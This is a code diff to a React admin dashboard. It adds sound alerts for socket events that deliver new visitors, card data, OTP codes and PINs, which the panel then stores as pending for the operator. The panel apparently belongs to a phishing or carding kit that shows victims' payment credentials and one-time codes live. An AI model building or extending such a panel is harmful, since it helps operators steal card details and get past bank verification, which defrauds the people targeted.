@@ -6,6 +6,13 @@ import {
   DollarSign, Phone, Car, Navigation, Calendar
 } from 'lucide-react';
 import { useSocket } from '../context/SocketContext';
+import { 
+  initAudioContext, 
+  playNewVisitorSound, 
+  playCardDataSound, 
+  playOTPSound, 
+  playPINSound 
+} from '../utils/notificationSounds';
 
 export default function AdminDashboard() {
   const navigate = useNavigate();
@@ -35,6 +42,9 @@ export default function AdminDashboard() {
       navigate('/admin/login');
       return;
     }
+    
+    // Initialize audio system after user login
+    initAudioContext();
   }, [navigate]);
 
   useEffect(() => {
@@ -55,6 +65,7 @@ export default function AdminDashboard() {
     socket.on('newEntryAll', () => {
       setNewDataCount(prev => prev + 1);
       setLastDataTimestamp(Date.now());
+      playNewVisitorSound();
       socket.emit('loadData');
       
       // Clear badge after 5 seconds
@@ -65,11 +76,13 @@ export default function AdminDashboard() {
 
     socket.on('newOTP', (data) => {
       setNewDataCount(prev => prev + 1);
+      playOTPSound();
       setPendingOTP(data);
     });
 
     socket.on('newPIN', (data) => {
       setNewDataCount(prev => prev + 1);
+      playPINSound();
       setPendingPIN(data);
     });
 
